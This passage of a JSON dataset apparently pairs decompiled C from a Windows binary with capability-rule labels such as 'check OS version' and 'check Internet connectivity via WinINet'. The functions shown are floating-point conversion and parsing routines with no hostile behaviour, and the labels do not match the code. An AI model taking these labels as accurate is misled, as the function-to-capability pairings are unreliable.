 ((*0x42ac7c != iVar1 && (pcVar4 = fcn.00406972(*0x42ac7c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040b4ed:\n    pcVar4 = fcn.00406972(*0x42ac74);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 827
    },
    "0040dc4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dc4c(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040e14d;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040dd81;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040dd88;\ncode_r0x0040dd81:\n                        do {\n                            var_4h = 1;\ncode_r0x0040dd88:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040dd96;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040dd96:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x413e84 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x413e84 < iVar12) {\n                if (iVar12 < *0x413e80) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x413e80;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040e14d;\n            }\n            var_10h = *0x413e84 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040df39;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040df39:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040e14d:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3668
    },
    "0040e190": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e190(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040e691;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x413ea0 - 1;\n        iVar4 = *0x413ea0 + (*0x413ea0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x413ea0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040e2c5;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040e2cc;\ncode_r0x0040e2c5:\n                        do {\n                            var_4h = 1;\ncode_r0x0040e2cc:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040e2da;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040e2da:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x413e9c - *0x413ea0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x413e9c < iVar12) {\n                if (iVar12 < *0x413e98) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x413eac;\n                    iVar4 = *0x413ea4 + (*0x413ea4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x413ea4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x413ea4 + (*0x413ea4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x413ea4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x413eac + *0x413e98;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040e691;\n            }\n            var_10h = *0x413e9c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x413ea0 - 1;\n            iVar12 = *0x413ea0 + (*0x413ea0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x413ea0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040e47d;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040e47d:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x413ea4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040e691:\n    var_20h = iVar12 << (0x1fU - *0x413ea4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x413ea8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x413ea8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3651
    },
    "0040e6d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040e996)\n// WARNING: Removing unreachable block (ram,0x0040e95f)\n// WARNING: Removing unreachable block (ram,0x0040ed47)\n// WARNING: Removing unreachable block (ram,0x0040e96e)\n// WARNING: Removing unreachable block (ram,0x0040e976)\n// WARNING: Removing unreachable block (ram,0x0040e97c)\n// WARNING: Removing unreachable block (ram,0x0040e97f)\n// WARNING: Removing unreachable block (ram,0x0040e986)\n// WARNING: Removing unreachable block (ram,0x0040e990)\n// WARNING: Removing unreachable block (ram,0x0040e9eb)\n// WARNING: Removing unreachable block (ram,0x0040e9e5)\n// WARNING: Removing unreachable block (ram,0x0040e9f1)\n// WARNING: Removing unreachable block (ram,0x0040ea0e)\n// WARNING: Removing unreachable block (ram,0x0040ea10)\n// WARNING: Removing unreachable block (ram,0x0040ea18)\n// WARNING: Removing unreachable block (ram,0x0040ea1b)\n// WARNING: Removing unreachable block (ram,0x0040ea20)\n// WARNING: Removing unreachable block (ram,0x0040ea23)\n// WARNING: Removing unreachable block (ram,0x0040ed50)\n// WARNING: Removing unreachable block (ram,0x0040ea2e)\n// WARNING: Removing unreachable block (ram,0x0040ed67)\n// WARNING: Removing unreachable block (ram,0x0040ed6e)\n// WARNING: Removing unreachable block (ram,0x0040ea39)\n// WARNING: Removing unreachable block (ram,0x0040ea4c)\n// WARNING: Removing unreachable block (ram,0x0040ea4e)\n// WARNING: Removing unreachable block (ram,0x0040ea5b)\n// WARNING: Removing unreachable block (ram,0x0040ea60)\n// WARNING: Removing unreachable block (ram,0x0040ea66)\n// WARNING: Removing unreachable block (ram,0x0040ea6f)\n// WARNING: Removing unreachable block (ram,0x0040ea76)\n// WARNING: Removing unreachable block (ram,0x0040ea8e)\n// WARNING: Removing unreachable block (ram,0x0040ea9f)\n// WARNING: Removing unreachable block (ram,0x0040eaad)\n// WARNING: Removing unreachable block (ram,0x0040eaec)\n// WARNING: Removing unreachable block (ram,0x0040eaf5)\n// WARNING: Removing unreachable block (ram,0x0040ed0d)\n// WARNING: Removing unreachable block (ram,0x0040eb03)\n// WARNING: Removing unreachable block (ram,0x0040eb0d)\n// WARNING: Removing unreachable block (ram,0x0040ed28)\n// WARNING: Removing unreachable block (ram,0x0040eb1a)\n// WARNING: Removing unreachable block (ram,0x0040eb21)\n// WARNING: Removing unreachable block (ram,0x0040eb2b)\n// WARNING: Removing unreachable block (ram,0x0040eb30)\n// WARNING: Removing unreachable block (ram,0x0040eb40)\n// WARNING: Removing unreachable block (ram,0x0040eb45)\n// WARNING: Removing unreachable block (ram,0x0040eb4f)\n// WARNING: Removing unreachable block (ram,0x0040eb54)\n// WARNING: Removing unreachable block (ram,0x0040eb66)\n// WARNING: Removing unreachable block (ram,0x0040eb73)\n// WARNING: Removing unreachable block (ram,0x0040eb82)\n// WARNING: Removing unreachable block (ram,0x0040eb8f)\n// WARNING: Removing unreachable block (ram,0x0040ebac)\n// WARNING: Removing unreachable block (ram,0x0040ebb0)\n// WARNING: Removing unreachable block (ram,0x0040ebb7)\n// WARNING: Removing unreachable block (ram,0x0040ebc0)\n// WARNING: Removing unreachable block (ram,0x0040ebc3)\n// WARNING: Removing unreachable block (ram,0x0040ebd4)\n// WARNING: Removing unreachable block (ram,0x0040ebe2)\n// WARNING: Removing unreachable block (ram,0x0040ebed)\n// WARNING: Removing unreachable block (ram,0x0040ebf4)\n// WARNING: Removing unreachable block (ram,0x0040ec1f)\n// WARNING: Removing unreachable block (ram,0x0040ec24)\n// WARNING: Removing unreachable block (ram,0x0040ec2f)\n// WARNING: Removing unreachable block (ram,0x0040ec38)\n// WARNING: Removing unreachable block (ram,0x0040ec3e)\n// WARNING: Removing unreachable block (ram,0x0040ec41)\n// WARNING: Removing unreachable block (ram,0x0040ec67)\n// WARNING: Removing unreachable block (ram,0x0040ec6c)\n// WARNING: Removing unreachable block (ram,0x0040ec71)\n// WARNING: Removing unreachable block (ram,0x0040ec7e)\n// WARNING: Removing unreachable block (ram,0x0040ec8f)\n// WARNING: Removing unreachable block (ram,0x0040ecc0)\n// WARNING: Removing unreachable block (ram,0x0040ec95)\n// WARNING: Removing unreachable block (ram,0x0040ecbb)\n// WARNING: Removing unreachable block (ram,0x0040ec9f)\n// WARNING: Removing unreachable block (ram,0x0040ecb5)\n// WARNING: Removing unreachable block (ram,0x0040ecae)\n// WARNING: Removing unreachable block (ram,0x0040ecc3)\n// WARNING: Removing unreachable block (ram,0x0040ecf0)\n// WARNING: Removing unreachable block (ram,0x0040eccd)\n// WARNING: Removing unreachable block (ram,0x0040eb58)\n// WARNING: Removing unreachable block (ram,0x0040eb35)\n// WARNING: Removing unreachable block (ram,0x0040ed2b)\n// WARNING: Removing unreachable block (ram,0x0040ea71)\n// WARNING: Removing unreachable block (ram,0x0040ed35)\n// WARNING: Removing unreachable block (ram,0x0040ed76)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040e6d4(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00405128();\n        *puVar2 = 0x16;\n        fcn.004050c0(0, 0, 0, 0, 0);\n        fcn.0040a174(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040e767. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40ed9c\n    (**0x40ed9c)();\n    return;\n}\n",
        "token_count": 1871
    },
    "00410178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
